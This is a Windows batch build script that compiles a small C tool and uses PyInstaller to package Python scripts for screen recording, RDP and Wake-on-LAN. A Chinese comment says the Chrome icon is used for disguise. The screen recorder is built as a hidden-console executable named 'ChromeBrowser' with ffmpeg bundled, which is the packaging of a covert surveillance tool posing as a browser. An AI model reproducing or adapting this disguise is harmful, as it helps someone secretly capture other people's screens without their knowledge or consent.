@echo off
rmdir /s /q build
rmdir /s /q out
del /s /q *.spec

mkdir out
clang quickset.c -o out\quickset.exe
REM 为了进行伪装 故使用了Chrome浏览器的图标
pyinstaller -i ".\icon\icon_chrome.ico" --distpath out --add-binary ".\bin\ffmpeg.exe;." --name "ChromeBrowser" --hide-console hide-early --onefile screenrecord.py
pyinstaller -i ".\icon\icon_rdp.ico" --distpath out --onefile rdp.py
pyinstaller --onefile --distpath out wol.py